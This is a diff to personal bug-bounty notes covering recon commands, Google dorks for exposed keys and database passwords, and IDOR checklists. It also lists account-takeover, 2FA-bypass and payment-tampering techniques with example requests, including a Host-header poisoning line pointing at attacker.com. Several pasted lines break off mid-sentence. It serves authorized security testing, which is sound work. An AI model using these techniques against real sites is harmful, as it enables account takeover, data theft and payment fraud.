@@ -28,9 +28,9 @@ how to use files everywhere
 smarthackerone1@gmail.com
 githubtesting049@gmail.com
 alastly38@gmail.com
-
-     my recon section
-place all the target in burpdsite  
+ 
+                my recon section
+         place all the target in burpdsite  
                                  1
                subdomain enumeration
                amass, subfinder, assetfinder and sublister, findomain
@@ -83,6 +83,9 @@ place all the target in burpdsite
                Search Subdomain using Gospider
                gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
                
+               NEW SUBDOMAINS FOR YOUR TARGET?
+               curl -s --request GET --url https://api.securitytrails.com/v1/domain/target.com/subdomains?apikey=API_KEY | jq '.subdomains[]' | sed 's/\"//g' >test.txt 2>/dev/null && sed "s/$/.target.com/" test.txt | sed 's/ //g' && rm test.txt
+               
                  2
                 FILTERING OUT LIVE SUBDOMIN
                  httpx and httprobe
@@ -122,12 +125,14 @@ place all the target in burpdsite
                  finding parameters, 
                  arjun , paramspider ,gf  check github
                  
+        
+                 
                  arjun -u https://www.example.com/file.php 
                  paramspider -l domains.txt -s
                  gospider -S domains.txt -o gospider
                  
                  5
-                 URL RECON - EXTRACTION
+                 URL RECON - EXTRACTION  and find sensitive files 
                  gau, gospider, katana
                  
                  gau
@@ -159,6 +164,11 @@ place all the target in burpdsite
                  
                  katana -list urls.txt -v -jc -o katana
                  katana -u http://testphp.vulnweb.com -js-crawl -d 5 -hl -filed endpoint | anew endpoint.txt
+                 
+                    # Search for testing point with gau and fff
+                  gau target -subs | cut -d"?" -f1 | grep -E "\.js+(?:on|)$" | tee urls.txt
+                 sort -u urls.txt | fff -s 200 -o out/
+
                  
                  
                  
@@ -213,6 +223,12 @@ place all the target in burpdsite
               
                    cat | gf redirect | tee redirect.txt 
                    
+                   
+                   # Search for testing point with gau and fff
+                   gau target -subs | cut -d"?" -f1 | grep -E "\.js+(?:on|)$" | tee urls.txt
+                     sort -u urls.txt | fff -s 200 -o out/
+
+                   
                    7
                AUTOMATIC REPLACE WITH PAYLOAD
                qsreplace .. check github
@@ -246,6 +262,7 @@ place all the target in burpdsite
   
       # Normal Install
       go install github.com/hakluke/hakrawler@latest
+      https://github.com/GerbenJavado/LinkFinder
 
      # Single URL
       echo https://target.com | hakrawler
@@ -275,6 +292,7 @@ hakrawler -url "${1}" -plain -usewayback -wayback | grep "${1}" | grep "=" | egr
    
                16
                 SUBDOMAIN TAKEOVER
+                https://github.com/Cyber-Guy1/Subdomainer
      Hostilesubruteforce
      ruby sub-brute.rb
      
@@ -287,12 +305,24 @@ hakrawler -url "${1}" -plain -usewayback -wayback | grep "${1}" | grep "=" | egr
     pipx install bbot
      bbot -t evilcorp.com -f subdomain-enum
      bbot -t evilcorp.com -f subdomain-enum -rf passive             //passive enum
+     httpx -l subdomains.txt -o live_subdomains.txt
+     
+     
+     methodology 
+     checck for subdomian using amass, sublistr
+       httpx -l subdomains.txt -o live_subdomains.txt       for live subdomian
+       use nuclei template to identify
+     nuclei -t <path>/nuclei-templates/takeovers/* -l all-live.txt
+     
+     
+     
        
      GOOGLE DORK FOR SUBDOMAIN TAKEOVER  
      site:"*,example.com" intext:"PAGE NOT FOUND" | intext:"project not found" | intext:"repository not found" | intext:"domain does not exist" 
      | intext:"this page cound not be found" | intext:"404 Blog is not found" | intext:"domain name is invalid" | intext:"No settings were found for this company"
      cat domains.txt | assetfinder --subs-only | tee subdomains.txt; subjack -w subdomains.txt -ssl -t 100 | tee -a takeover.txt | grep -v "Vulnerable"
      
+    
                  
       17
      using nuclie
@@ -301,8 +331,14 @@ hakrawler -url "${1}" -plain -usewayback -wayback | grep "${1}" | grep "=" | egr
      ADMIN LOGIN ONLINER
      cat domains_list.txt | httpx -ports 80,443,8080,8443 -path /admin -mr "admin"
      
+     
+     CHECK FOR RCE
+     amass enum -active -d $1 -brute -w ~/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o amass.txt
+   cat amass.txt | aquatone -ports xlarge -out aqua_$1
+   nuclei -l aqua_$1/aquatone_urls.txt -t ~/nuclei-templates -es info -o nuclei_$1.txt
      403 login Bypass
    cat hosts.txt | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx -path //login -mc 200 -t 300 -nc -silent
+    git-dumper http://example.com/.git/ output
      
     
    
@@ -520,6 +556,14 @@ Broad domain search w/ negative search
 site:example.com -www -shop -share -ir -mfa
 
  site:example.com intext:password | passcode | intext:username | userid | user | email | credit card | SSN filetype:csv
+ 
+ inurl:example.com intitle:"index of"
+inurl:example.com intitle:"index of /" "*key.pem"
+inurl:example.com ext:log
+inurl:example.com intitle:"index of" ext:sql|xls|xml|json|csv
+inurl:example.com "MYSQL_ROOT_PASSWORD:" ext:env OR ext:yml -git
+ 
+ 
  
   GOOGLE DORK FOR SUBDOMAIN TAKEOVER  
      site:"*,example.com" intext:"PAGE NOT FOUND" | intext:"project not found" | intext:"repository not found" | intext:"domain does not exist" 
@@ -906,15 +950,100 @@ nuclei -l js.txt -t ~/nuclei-templates/exposures/ -o js_exposures_results.txt
 
 
 
-   IDORS
-   check for Alot of nos  in whatever reposnse  you have.  while intercepint in burpsuite, allows try to change every value, eg-> error to success, 1234 to 3456, check if id is encoded or not in a plain text, the decode it, 
+   IDORS      IDORS      IDORS   
+   Base Steps:
+1. Create two accounts if possible or else enumerate users first.
+2. Check if the endpoint is private or public and does it contains any kind of id param.
+3. Try changing the param value to some other user and see if does anything to their account.
+4. Done !!
+[ ] [ ] image profilie [ ] delete acount [ ] infromation acount [ ] VIEW & DELETE & Create api_key [ ] allows
+to read any comment [ ] change price [ ] chnage the coin from dollar to uaro [ ] Try decode the ID, if the
+ID encoded using md5,base64,etc
+GET /GetUser/dmljdGltQG1haWwuY29t
+[...]
+[ ] change HTTP method
+GET /users/delete/victim_id ->403
+POST /users/delete/victim_id ->200
+[ ] Try replacing parameter names
+Instead of this:
+GET /api/albums?album_id=<album id>
+Try This:
+GET /api/albums?account_id=<account id>
+Tip: There is a Burp extension called Paramalyzer which
+will help with this by remembering all the parameters you have passed to a host.
+[ ] Path Traversal
+POST /users/delete/victim_id ->403
+POST /users/delete/my_id/..victim_id ->200
+[ ] change request content-type
+Content-Type: application/xml ->
+Content-Type: application/json
+[ ] swap non-numeric with numeric id
+GET /file?id=90djbkdbkdbd29dd
+GET /file?id=302
+[ ] Missing Function Level Acess Control
+GET /admin/profile ->401
+GET /Admin/profile ->200
+GET /ADMIN/profile ->200
+
+
+GET /aDmin/profile ->200
+GET /adMin/profile ->200
+GET /admIn/profile ->200
+GET /admiN/profile ->200
+[ ]send wildcard instead of an id
+GET /api/users/user_id ->
+GET /api/users/*
+[ ] Never ignore encoded/hashed ID
+for hashed ID ,create multiple accounts and understand the
+ppattern application users to allot an iD
+[ ] Google Dorking/public form
+search all the endpoints having ID which the search engine may have already indexed
+[ ] Bruteforce Hidden HTTP parameters
+use tools like arjun , paramminer
+[ ] Bypass object level authorization Add parameter onto the endpoit if not present by defualt
+GET /api_v1/messages ->200
+GET /api_v1/messages?user_id=victim_uuid ->200
+[ ] HTTP Parameter POllution Give mult value for same parameter
+GET /api_v1/messages?user_id=attacker_id&user_id=victim_id
+GET /api_v1/messages?user_id=victim_id&user_id=attacker_id
+[ ] change file type
+GET /user_data/2341 -> 401
+GET /user_data/2341.json -> 200
+GET /user_data/2341.xml -> 200
+GET /user_data/2341.config -> 200
+GET /user_data/2341.txt -> 200
+[ ] json parameter pollution
+{"userid":1234,"userid":2542}
+[ ] Wrap the ID with an array in the body
+{"userid":123} ->401
+{"userid":[123]} ->200
+
+[ ] wrap the id with a json object
+{"userid":123} ->401
+{"userid":{"userid":123}} ->200
+[ ] Test an outdata API version
+GET /v3/users_data/1234 ->401
+GET /v1/users_data/1234 ->200
+[ ] If the website using graphql, try to find IDOR using graphql!
+GET /graphql
+[...]
+GET /graphql.php?query=
+[...]
+
+
+   
+   
+   
+   check for Alot of nos  in whatever reposnse  you have.  while intercepint in burpsuite, allows try to change every value, eg-> error to success, 1234 to 3456, check if id is encoded or not in a plain text, then decode it, 
    check if file can be accessed directly from the url, without needing port authecation   //images are commoly venearble to this
    check by changing the request method, or expolit involves using a different method. 
-   ids not actually numbers but strings?, somtimes the id can be expolited via username or email change of an id
+   ids not actually numbers but strings?, somtimes the id can be expolited via username or email change of an i
    can you bypass payment
    can you do actions on others behalf
    can you destroy or damage any asset or info
    NOTE:: Almost 80% of idors are found in rest API, GET OR POST REQUEST BODY
+   
+   
        
        tip
    Create new password and confirm it then clicked in Reset Password button.
@@ -1036,6 +1165,28 @@ Lesson: Always test unusual login flows by logging in with a 3rd party provider 
 
 Takeaways: Always scrutinize critical app requests/responses for anomalies. Don't hesitate to spend an extra minute testing the basics—you might be pleasantly surprised by the results! 💡🐛💰
     
+    TIP
+     
+I've stumbled upon 10+ similar issues on shopping sites that allow guest checkouts 🛒. 
+
+Many overlook these issues because they require placing an order 📦. However, some services support cash on delivery 💸 or allow you to place a cheap order and then cancel it for a refund 🔄, making it worth adding to your checklist if other prerequisites are met.
+
+Here's what to look for:
+
+1️⃣ Target app that permits guest orders without creating an account 🕵️‍♂️
+2️⃣ Target app doesn't require email verification for new account creation, or you've found an email verification bypass on sign-up 📧🔓
+
+If these prerequisites are met, you can often find target apps with a misconfiguration that lets you access a guest user's order history by creating a new account with the same email used for the guest order. 
+
+Here's how it usually goes down:
+
+1️⃣ Place an order on the site as a "Guest" and use the victim's email during checkout, e.g., victim@example.com 📩 
+2️⃣ The victim receives an email with the receipt 📧
+3️⃣ As an attacker, sign up using the email victim@example.com assuming there's no email verification 🧑‍💻
+4️⃣ Navigate to the account's order history page, and you might strike gold 🪙 by finding the previously made orders, leading to Order History and PII leaks 🔍📜
+
+Takeaways: Don't ignore workflows involving payments; you might discover workarounds like cheap payments or cash on delivery 💡💳. Test for unusual flows and be ready for pleasant surprises with some lucrative bounties 
+   
       
     tip6
       
@@ -1168,6 +1319,14 @@ cat targets.txt  | httpx -mr "register"
 🚀 I've used this simple yet effective technique countless times on expansive scopes to gain an edge in bug hunting. Stay proactive and stay secure! 💡💻 
 
 
+
+   7)
+   when changing password functionality, always change the user name to administrator, admin to check if you could get in admin dashboard 
+   
+   and always check out from the store, intercept the request, add more items to your bucket and then send the  intercepted request with burp repeater and watch the response
+    
+
+
                My Bug hunting Methodology 📝
 
                  Registration Testing 
@@ -1199,7 +1358,458 @@ Here are some automated checks you can conduct on these subdomains:
 🌟 Identify Interesting Assets: Use title, keywords in response bodies, knowledge of vulnerable products, and more to identify intriguing assets for manual review.
 
 There are many additional ideas you can build upon to enhance your automation capabilities. Stay tuned for more insights! 
+
+
+
+
+
+           ACCOUNT TAKEOVER        ACCOUNT TAKEOVER             ACCOUNT TAKEOVER
+      
+   1) Check if weak password can be set
+       if yes, then check for brute-forcing
+    if no rate-limit 0r 429, too many requests response doesnst come within few minutes of bruteforcing, you can raise the report by mention
+    WEAK PASSWORD POLICY WITH NO RATE-LIMIT
+    
+   2) TRY TO SEND TOKEN IN RESET PASSSWORD
+     check on reset password
+     enter your mail id
+     intercept the request
+     add Token Parameter
+     {
+     email: "smaty@gmail.com",
+     token: "ggsgsgsfaagagagcz vzzvzzczcczczczcthisismytoken"                               any giberish
+     }
+     
+     check if the crafted token is sent or not , if yes report for account takeover
+     
+    
    
+    3)RESET PASSWORD POISONING
+    go to reset password function,
+    enter your email
+    intercet the request
+       change the Host header to some other Header such AS at Attacker.com,
+       Example:
+       Host: Taget.com  -> Host: attacker.com
+    Along with this, you can try to add new Headers   NOTE: dont change the header ( Host: Taget.com)
+        X-forword-Host: attacker.com,
+        Referrer:  https://attacker.com
+        
+    4) RESPONSE MANIPULATION
+      try with correct username and password
+        check the response status and body
+      
+      try wrong username and passwrod
+      change the reponse code and body with the response of the correct username and password
+      forward the request
+      
+     5
+     “always change in response from false to true you can find a magic”
+     1- run burp and login in website
+
+     go to proxy options and go match and replace
+
+      {{“areAdsDisabled”:false}} We change the value of this parameter to true in response body
+
+    Now we do a refresh of the site and browse it and it will not show any ads
+      
+    6) TRY CSRF ON MAJOR ENDPOINT
+     try Csrf on passowrd change
+     try csrf on email change
+     try csrf on phone no change 
+     try csrf on securlity change 
+   
+
+   
+   2FA BYPASS      2FA BYPASS         2FA BYPASS              2FA BYPASS
+   
+     Bypassing two-factor authentication
+[ ] Flawed two-factor verification logic Sometimes flawed logic in two-factor authentication means that
+after a user has completed the initial login step, the website doesn't adequately verify that the same user
+is completing the second step For example, the user logs in with their normal credentials in the first step
+as follows:
+POST /login-steps/first HTTP/1.1
+Host: vulnerable-website.com
+...
+username=carlos&password=qwerty
+They are then assigned a cookie that relates to their account, before being taken to the second step of
+the login process:
+HTTP/1.1 200 OK
+Set-Cookie: account=carlos
+GET /login-steps/second HTTP/1.1
+Cookie: account=carlos
+When submitting the verification code, the request uses this cookie to determine which account the user
+is trying to access:
+POST /login-steps/second HTTP/1.1
+Host: vulnerable-website.com
+Cookie: account=carlos
+...
+verification-code=123456`
+In this case, an attacker could log in using their own credentials but then change the value of the
+account cookie to any arbitrary username when submitting the verification code.
+POST /login-steps/second HTTP/1.1
+Host: vulnerable-website.com
+Cookie: account=victim-user
+...
+verification-code=123456
+[ ] Clickjacking on 2FA Disable Feature
+1. Try to Iframe the page where the application allows a user to disable 2FA
+2. If Iframe is successful, try to perform a social engineering attack to manipulate victim to
+[ ] Response Manipulation
+1. Check Response of the 2FA Request.
+2. If you Observe "Success":false
+3. Change this to "Success":true and see if it bypass the 2FA
+
+[ ] Status Code Manipulation
+1. If the Response Status Code is 4XX like 401, 402, etc.
+2. Change the Response Status Code to "200 OK" and see if it bypass the 2FA
+[ ] 2FA Code Reusability
+1. Request a 2FA code and use it
+2. Now, Re-use the 2FA code and if it is used successfully that's an issue.
+3. Also, try requesting multiple 2FA codes and see if previously requested Codes expire or not wh
+4. Also, try to re-use the previously used code after long time duration say 1 day or more. That
+[ ] CSRF on 2FA Disable Feature
+1. Request a 2FA code and use it
+2. Now, Re-use the 2FA code and if it is used successfully that's an issue.
+3. Also, try requesting multiple 2FA codes and see if previously requested Codes
+expire or not when a new code is requested
+4. Also, try to re-use the previously used code after long time duration say 1 day or
+more. That will be an potential issue as 1 day is enough duration to crack and guess
+a 6-digit 2FA code
+[ ] Backup Code Abuse
+Apply same techniques used on 2FA such as Response/Status Code Manipulation,
+Brute-force, etc. to bypass Backup Codes and disable/reset 2FA
+[ ] Enabling 2FA Doesn't Expire Previous Session
+1. Login to the application in two different browsers and enable 2FA from 1st session.
+2. Use 2nd session and if it is not expired, it could be an issue if there is an insufficient
+session expiration issue. In this scenario if an attacker hijacks an active session before
+2FA, it is possible to carry out all functions without a need for 2FA
+[ ] 2FA Refer Check Bypass
+1. Directly Navigate to the page which comes after 2FA or any other authenticated
+page of the application.
+2. If there is no success, change the refer header to the 2FA page URL. This may fool
+application to pretend as if the request came after satisfying 2FA Condition
+[ ] 2FA Code Leakage in Response
+1. At 2FA Code Triggering Request, such as Send OTP functionality, capture the Request.
+2. See the Response of this request and analyze if the 2FA Code is leaked.
+[ ] JS File Analysis
+1. while triggering the 2FA Code Request,
+2. Analyze all the JS Files that are referred in the Response
+
+3. to see if any JS file contain information that can help bypass 2FA code.
+[ ] Lack of Brute-Force Protection
+This involves all sort of issues which comes under security misconfiguration such as
+lack of rate limit, no brute-force protection, etc.
+1. Request 2FA code and capture this request.
+2. Repeat this request for 100-200 times and if there is no limitation set, that's a rate limit
+3. At 2FA Code Verification page, try to brute-force for valid 2FA and see if there is any succ
+4. You can also try to initiate, requesting OTPs at one side and brute-forcing at
+another side. Somewhere the OTP will match in middle and may give you a quick result
+[ ] Password Reset/Email Change - 2FA Disable
+1. Assuming that you are able to perform email change or password reset for the
+victim user or make victim user do it by any means possible.
+2. 2FA is disabled after the email is changed or password is reset. This could
+be an issue for some organizations. However, depends on case by case basis.
+[ ] Missing 2FA Code Integrity Validation
+1. Request a 2FA code from Attacker Account.
+2. Use this valid 2FA code in the victim 2FA Request and see if it bypass the 2FA Protection.
+[ ] Direct Request
+1. Directly Navigate to the page which comes after 2FA or any other authenticated
+page of the application.
+2. See if this bypasses the 2FA restrictions.
+3. try to change the **Referrer header** as if you came from the 2FA page.
+[ ] Reusing token
+1. Maybe you can reuse a previously used token inside the account to authenticate.
+[ ] Sharing unused tokens
+1. Check if you can get the token from your account and try to use it to bypass the 2FA in a diff
+[ ] Leaked Token
+1. Is the token leaked on a response from the web application?
+[ ] Session permission
+1. Using the same session start the flow using your account and the victim's account.
+2. When reaching the 2FA point on both accounts,
+3. complete the 2FA with your account but do not access the next part.
+4. Instead of that, try to access the next step with the victim's account flow.
+5. If the back-end only set a boolean inside your sessions saying that you have successfully pass
+[ ] Password reset function
+1. In almost all web applications the **password reset function automatically logs the user into
+2. Check if a **mail** is sent with a **link** to **reset the password** and if you can **reuse**
+[ ] Lack of Rate limit
+Is there any limit on the number of codes that you can try, so you can just brute force it? Be ca
+[ ] Flow rate limit but no rate limit
+In this case, there is a flow rate limit (you have to brute force it very slowly: 1 thread and so
+[ ] Re-send code and reset the limit
+There is a rate limit but when you "resend the code" the same code is sent and the rate limit is
+[ ] Client side rate limit bypass
+{% content-ref url="rate-limit-bypass.md" %} rate-limit-bypass.md {% endcontent-ref %}
+[ ] Lack of rate limit in the user's account
+Sometimes you can configure the 2FA for some actions inside your account (change mail, password..
+[ ] Lack of rate limit re-sending the code via SMS
+You won't be able to bypass the 2FA but you will be able to waste the company's money.
+[ ] Infinite OTP regeneration
+If you can **generate a new OTP infinite times**, the** OTP is simple enough** (4 numbers), and y
+[ ] Guessable cookie
+If the "remember me" functionality uses a new cookie with a guessable code, try to guess it.
+
+When the 2FA is enabled, previous sessions created should be ended. This is because when a client
+[ ] Improper access control to backup codes
+Backup codes are generated immediately after 2FA is enabled and are available on a single request
+[ ] Information Disclosure
+If you notice some confidential information appear on the 2FA page that you didn't know previousl
+[ ] Bypass 2FA with null or 000000
+[ ] Previously created sessions continue being valid after MFA activation
+1 access the same account on https://account.grammarly.com in two devices
+2 on device 'A' go to https://account.grammarly.com/security > complete all steps to activate the
+Now the 2FA is activated for this account
+3 back to device 'B' reload the page The session still active
+[ ] Enable 2FA without verifying the email I able to add 2FA to my account without verifying my email
+Attack scenario :
+Attacker sign up with victim email (Email verification will be sent to victim email).
+Attacker able to login without verifying email.
+Attacker add 2FA.
+[ ] Password not checked when disabling 2FA
+PoC
+1- go to your account and activate the 2FA from /settings/auth
+2- after active this option click on Disabled icon beside Two-factor authentication.
+3- a new window will open asking for Authentication or backup code - Password to confirm the disable
+
+4- in the first box enter a valid Authentication or backup code and in the password filed enter a
+5- the option will be disabled successful without check the validation of the password.
+[ ] “email” MFA mode allows bypassing MFA from victim’s device when the device trust is not expired
+Steps To Reproduce:
+Note:
+1-Use burp suite or another tool to intercept the requests
+2-Turn on and configure your MFA
+3-Login with your email and password
+4-The page of MFA is going to appear
+5-Enter any random number
+6-when you press the button "sign in securely" intercept the request POST auth.grammarly.com/v3/a
+"mode":"sms" by "mode":"email"
+"secureLogin":true by "secureLogin":false
+7-send the modification and check, you are in your account! It was not necessary to enter the pho
+[ ] 2FA bypass by sending blank code
+1- Login to Glassdoor and navigate to https://www.glassdoor.com/member/account/securitySettings_i
+2- Enable 2FA
+3- Logout
+4- Login again and notice OTP is asked
+5- Now using Burp suite intercept the POST request by sending incorrect code. [Do not forward]
+6- Before forwarding the request to server, remove the code and forward
+7- Turnoff Intercept and notice that your login request has been fulfilled
+
+
+
+Bussiness Logic Error Cheatsheet          Bussiness Logic Error Cheatsheet       Bussiness Logic Error Cheatsheet
+
+1. change the price with other price :100->50
+2. change the price with nagative price :100->-100
+3. change the price with other price by add nagative value: 100 ->(+-120)
+4. change the price with other price by mult by 0.5: 100->(0.5*100)
+5. Retrieving a Profile
+For example, Jack’s profile can be fetched with id=1001 and if this value
+changed to 1089 we get another user’s information. A scanner may go on and
+change the value from 1001 to **‘1001** to find SQL injection, but not to 1089 and
+would miss deducing that the application is vulnerable to authorization bypass. By changing the “
+6. Shopping Cart
+Let us consider an online store application where customers add items to their shopping cart. The
+may make it possible for attackers to bypass the authentication processes to
+directly log into the shopping cart application and avoid paying for “purchased” items.
+7. Review Functionality
+Some applications have an option where verified reviews are marked with some tick or it's
+mentioned. Try to see if you can post a review as a Verified Reviewer without purchasing that
+product.
+Some app provides you with an option to provide a rating on a scale of 1 to 5, try to go
+beyond/below the scale-like provide 0 or 6 or -ve.
+Try to see if the same user can post multiple ratings for a product. This is an interesting
+endpoint to check for Race Conditions.
+Try to see if the file upload field is allowing any exts, it's often observed that the devs miss out
+on implementing protections on such endpoints.
+Try to post reviews like some other users.
+Try performing CSRF on this functionality, often is not protected by tokens
+8. Coupon Code Functionality
+Apply the same code more than once to see if the coupon code is reusable.
+If the coupon code is uniquely usable, try testing for Race Condition on this function by using
+the same code for two accounts at a parallel time.
+Try Mass Assignment or HTTP Parameter Pollution to see if you can add multiple coupon codes
+while the application only accepts one code from the Client Side.
+Try performing attacks that are caused by missing input sanitization such as XSS, SQLi, etc. on
+this field
+Try adding discount codes on the products which are not covered under discounted items by
+tampering with the request on the server-side.
+9. **Delivery Charges Abuse **
+Try tampering with the delivery charge rates to -ve values to see if the final amount can be
+reduced.
+
+
+Try checking for the free delivery by tampering with the params.
+10. **Currency Arbitrage **
+Pay in 1 currency say USD and try to get a refund in EUR. Due to the diff in conversion rates, it might
+be possible to gain more amount.
+11. **Premium Feature Abuse **
+Try forcefully browsing the areas or some particular endpoints which come under premium
+accounts.
+Pay for a premium feature and cancel your subscription. If you get a refund but the feature is still
+usable, it's a monetary impact issue.
+Some applications use true-false request/response values to validate if a user is having access to
+premium features or not.
+Try using Burp's Match & Replace to see if you can replace these values whenever you browse the
+app & access the premium features.
+Always check cookies or local storage to see if any variable is checking if the user should have access
+to premium features or not.
+12. Refund Feature Abuse
+Purchase a product (usually some subscription) and ask for a refund to see if the feature is still
+accessible.
+Try for currency arbitrage explained yesterday.
+Try making multiple requests for subscription cancellation (race conditions) to see if you can get
+multiple refunds.
+13. **Cart/Wishlist Abuse **
+Add a product in negative quantity with other products in positive quantity to balance the amount.
+Add a product in more than the available quantity.
+Try to see when you add a product to your wishlist and move it to a cart if it is possible to move it to
+some other user's cart or delete it from there.
+14. Thread Comment Functionality
+Unlimited Comments on a thread
+Suppose a user can comment only once, try race conditions here to see if multiple comments are
+possible.
+Suppose there is an option: comment by the verified user (or some privileged user) try to tamper
+with various parameters in order to see if you can do this activity.
+Try posting comments impersonating some other users.
+15. **Parameter Tampering **
+Tamper Payment or Critical Fields to manipulate their values
+Add multiple fields or unexpected fields by abusing HTTP Parameter Pollution & Mass Assignment
+Response Manipulation to bypass certain restrictions such as 2FA Bypass
+16. Parameter tampering can result in product price manipulation
+https://www.youtube.com/watch?v=3VMlV7j_yzg
+17. Manipulation of exam results at Semrush.Academy
+In this situation, it was possible to bypass the exam process. That is to replace the results of the
+exam with the correct ones and send a request to get the certificate right away. And to replace the
+results with the correct ones turned out, because the body of the request was json, where 1 = true,
+and empty = false.
+Steps To Reproduce:
+1. Finished exams with any answers
+2. Retake exam
+3. Send the last request of our answer
+Example body: `{"answers":
+{"503":"","504":"","505":"1","506":"","507":"","591":"1","592":"","593":"","594":"","595":"","596":"","1340":"1","
+1341":"","1342":"","1343":"","1344":"","1345":"","1351":"1","1352":"","1353":"","1354":"","1355":"","1356":"","
+1357":"","1358":"1","1359":"","1360":"","1361":"","1362":"","1363":"","1365":"1"}}
+18. Authentication flags and privilege escalations at application layer. Applications have their own
+access control lists (ACLs) and privileges. The most critical aspect of the application related to
+security is authentication. An authenticated user has access to
+the internal pages and structures that reside behind the login section. These privileges can be
+maintained by the database, LDAP, file etc. If the implementation of authorization is weak, it
+opens up possible vulnerabilities. If these vulnerabilities are identified
+during a test, then there is the potential for exploitation. This exploitation would likely include
+accessing another user’s content or becoming a higher-level user with greater permissions to do
+greater damage How to test for this business logic flaw:
+• During the profiling phase or through a proxy observe the HTTP traffic, both request and respon
+• POST/GET requests would have typical parameters either in name-value pair, JSON, XML or Cookies
+the parameter and the value need to be analyzed.
+• If the parameter name is suspicions and suggests that it has something to do with ACL/Permissio
+target.
+• Once the target is identified, the next step is evaluating the value, it can be encoded in hex,
+should do some tampering and try to define its behavior with bit of fuzzing.
+• In this case, fuzzing may need a logical approach, changing bit patterns or permission flags li
+on. Some combination of bruteforcing, logical deduction and artistic tampering will help to decip
+successful then we get a point for exploitation and end up escalating privileges or bypassing aut
+19. Critical Parameter Manipulation and Access to Unauthorized Information/Content. HTTP GET and
+POST requests are typically accompanied with several parameters when submitted to the
+application. These parameters can be in the form of name/value pairs, JSON, XML etc. Interestingly,
+these parameters can be tampered with and guessed (predicted) as well. If the business logic of the
+application is processing these parameters before validating them, it can lead to
+information/content disclosure. This is another common business logic flaw that is easy to exploit
+How to test for this business logic flaw:
+• During the profiling phase or through a proxy, observe HTTP traffic, both request and response
+• POST/GET requests would have typical parameters either in name-value pair, JSON, XML or Cookies
+the parameter and the value need to be analyzed.
+• Observe the values in the traffic and look for incrementing numbers and easily guessable values
+• This parameter’s value can be changed and one may gain unauthorized access.
+In the above case we were able to access other users profiles
+
+
+20. Developer’s cookie tampering and business process/logic bypass. Cookies are an essential
+component to maintain state over HTTP. In many cases, developers are not using session cookies
+only, but instead are building data internally using session only variables. Application developers set
+new cookies on the browser at important junctures which exposes logical holes. After authentication
+logic sets several parameters based
+on credentials, developers have two options to maintain these credentials across applications. The
+developer can set the parameters in session variables or set cookies in the browser
+with appropriate values. If application developers are passing cookies, then
+they might be reverse engineered or have values that can be guessed/ deciphered. It can create a
+possible logical hole or bypass. If an attacker can identify this hole then they can exploit it with ease
+How to test for this business logic flaw:
+• During the profiling phase or through a proxy observe the HTTP traffic, both request and respon
+• Analyze all cookies delivered during the profiling, some of these cookies will be defined by de
+session cookies defined by the web application server.
+• Observe cookie values in specific, look for incrementing easily guessable values across all coo
+• Cookie value can be changed and one may gain unauthorized access or logical escalation
+21. ** LDAP Parameter Identification and Critical Infrastructure Access** LDAP is becoming an important
+aspect for large applications and it may get integrated with ”single sign on” as well. Many
+infrastructure layer tools like Site Minder or Load Balancer use LDAP for both authentication and
+authorization. LDAP parameters can carry business logic decision flags and those can be abused and
+leveraged. LDAP filtering being done at the business application layer enable logical injections to be
+possible on those parameters. If the application is
+not doing enough validation then LDAP injection and business layer bypasses are possible.
+How to test for this business logic flaw:
+• During the profiling phase or through a proxy observe the HTTP traffic, both request and respon
+• POST/GET requests would have typical parameters either in name-value pair, JSON, XML or Cookies
+the parameter and the value need to be analyzed.
+• Analyze parameters and their values, look for ON,CN,DN etc. Usually these parameters are linked
+for the parameter taking email or usernames, these parameters can be prospective targets.
+• These target parameters can be manipulated and injected with “*” or any other LDAP specific fil
+can lead to logical bypass over LDAP and end up escalating access rights.
+22. Business Constraint Exploitation The application’s business logic should have defined rules and
+constraints that are very critical for an application. If these constraints are bypassed by an attacker,
+then it can be exploited. User
+fields that have poor design or implementation are often controlled by these business constraints. If
+business logic is processing variables controlled as hidden values then it leads to easy discovery and
+exploitation. While crawling and profiling the application, one can list all these possible different
+values and their injection places. It is easy to browse through these hidden fields and understand
+their context; if context is leveraged to control the business rules then manipulation of this
+information can lead to critical business logic vulnerabilities. How to test for this business logic flaw:
+• During the profiling phase or through a proxy observe the HTTP traffic, both the request and re
+• POST/GET requests would have typical parameters either in name-value pair, JSON, XML or Cookies
+the parameter and the value need to be analyzed.
+• Analyze hidden parameters and their values, look for business specific calls like transfer mone
+• These target parameters can be manipulated and values can be changed. It is possible to avoid 
+
+23. Business Flow Bypass Applications include flows that are controlled by redirects and page transfers.
+After a successful login, for example, the application will transfer the user to the money transfer
+page.During these transfers, the user’s session is maintained by a session cookie or other
+mechanism. In many cases,
+this flow can be bypassed which can lead to an error condition or information leakage. This leakage
+can help an attacker identify critical back-end information. If this flow is controlling
+and giving critical information out then it can be exploited in various use cases and scenarios How
+to test for this business logic flaw:
+• During the profiling phase or through a proxy observe the HTTP traffic, both request and respon
+• POST/GET requests would have typical parameters either in name-value pair, JSON, XML or Cookies
+• Identify business functionalities which are in specific steps (e.g. a shopping cart or wire tra
+• Analyze all steps carefully and look for possible parameters which are added by the application
+• These parameters can be tampered through a proxy while making the transaction. This disrupts th
+24. ** Identity or Profile Extraction** A user’s identity is one of the most critical parameters in
+authenticated applications. The identities of users are maintained using session or other forms of
+tokens. Poorly designed and
+developed applications allow an attacker to identify these token parameters from the client side and
+in some cases they are not closely maintained on the server side of the session as well. This scenario
+opens up a potential opportunity for abuse and system wide exploitation. The
+token is either using only a sequential number or a guessable username How to test for this
+business logic flaw:
+• During the profiling phase or through particular proxy observe HTTP traffic, both request and r
+• POST/GET requests would have typical parameters either in name-value pair, JSON, XML or Cookies
+• Look for parameters which are controlling profiles.
+• Once these target parameters are identified, one can decipher, guess or reverse engineer tokens
+25. File or Unauthorized URL Access and Business Information Extraction Identity Business
+applications contain critical information in their features, in the files that are exported and in the
+export functionality itself. A user can export their data in a selected file format (PDF, XLS or CSV) and
+download it. If this functionality is not carefully implemented, it can enable asset leakage. An
+attacker can extract this information from the application layer. This is one of the most common
+mistakes and easy to exploit as well. These files can be fetched directly
+from URLs or by using some internal parameters. How to test for this business logic flaw:
+• During the profiling phase or through a particular proxy, observe the HTTP traffic, both reques
+• POST/GET requests would have typical parameters either in a name-value pair, JSON, XML or Cooki
+• Identify file call functionalities based on parameter names like file, doc, dir etc. These para
+• Once a target parameter has been identified start doing basic brute force or guess work to fetc
+26. null pyloads
